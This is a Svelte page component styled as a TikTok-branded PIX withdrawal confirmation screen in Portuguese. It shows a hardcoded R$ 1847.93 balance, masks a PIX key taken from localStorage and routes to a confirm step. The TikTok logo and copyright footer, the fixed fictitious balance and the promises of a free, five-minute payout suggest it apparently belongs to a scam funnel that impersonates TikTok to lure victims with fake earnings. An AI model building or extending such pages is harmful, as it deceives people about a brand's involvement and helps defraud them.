<script lang="ts">
  import { push } from 'svelte-spa-router';
  import { onMount } from 'svelte';

  let balance = $state(1847.93);
  let pixKey = $state('');
  let pixKeyType = $state('cpf');

  onMount(() => {
    pixKey = localStorage.getItem('pixKey') || '';
    pixKeyType = localStorage.getItem('pixKeyType') || 'cpf';
  });

  function handleConfirm() {
    push('/confirm');
  }

  function maskPixKey(key: string, type: string): string {
    if (type === 'cpf') {
      return key.replace(/(\d{3})\.(\d{3})\.(\d{3})-(\d{2})/, '***.$2.***-**');
    }
    if (type === 'email') {
      const [user, domain] = key.split('@');
      return `${user.slice(0, 2)}***@${domain}`;
    }
    if (type === 'phone') {
      return key.replace(/\((\d{2})\) (\d{5})-(\d{4})/, '(**) *****-$3');
    }
    return `${key.slice(0, 8)}...`;
  }
</script>

<div class="min-h-screen bg-black flex flex-col">
  <header class="bg-black py-4 flex justify-center">
    <img src="/assets/tiktok-logo-white.svg" alt="TikTok" class="h-8" />
  </header>

  <main class="flex-1 flex flex-col items-center px-4 pb-8">
    <div class="bg-white rounded-lg w-full max-w-md p-6 shadow-lg">
      <h2 class="text-xl font-semibold text-gray-900 mb-2 text-center">
        Confirmar saque
      </h2>
      <p class="text-gray-500 text-sm text-center mb-6">
        Revise os dados antes de confirmar
      </p>

      <div class="bg-gray-50 rounded-lg p-4 mb-6 space-y-4">
        <div class="flex justify-between items-center">
          <span class="text-gray-600">Valor do saque</span>
          <span class="font-semibold text-gray-900">
            R$ {balance.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
          </span>
        </div>
        <div class="border-t border-gray-200"></div>
        <div class="flex justify-between items-center">
          <span class="text-gray-600">Tipo da chave</span>
          <span class="font-medium text-gray-900">{pixKeyType.toUpperCase()}</span>
        </div>
        <div class="flex justify-between items-center">
          <span class="text-gray-600">Chave PIX</span>
          <span class="font-medium text-gray-900">{maskPixKey(pixKey, pixKeyType)}</span>
        </div>
        <div class="border-t border-gray-200"></div>
        <div class="flex justify-between items-center">
          <span class="text-gray-600">Taxa</span>
          <span class="font-medium text-green-600">Grátis</span>
        </div>
        <div class="flex justify-between items-center">
          <span class="text-gray-600">Prazo</span>
          <span class="font-medium text-gray-900">Até 5 minutos</span>
        </div>
      </div>

      <div class="flex items-start gap-3 p-4 bg-yellow-50 border border-yellow-200 rounded-lg mb-6">
        <svg class="w-5 h-5 text-yellow-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
          <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
        </svg>
        <p class="text-sm text-yellow-800">
          Ao confirmar, você concorda que os dados informados estão corretos e o saque será processado.
        </p>
      </div>

      <button
        onclick={handleConfirm}
        class="w-full bg-gray-900 text-white py-4 rounded-lg font-semibold hover:bg-gray-800 transition-colors"
      >
        Confirmar saque
      </button>

      <button
        onclick={() => push('/add')}
        class="w-full text-gray-600 py-3 text-sm hover:text-gray-900 transition-colors"
      >
        Editar dados
      </button>
    </div>

    <p class="text-gray-500 text-sm mt-8">© 2025 — TikTok</p>
  </main>
</div>
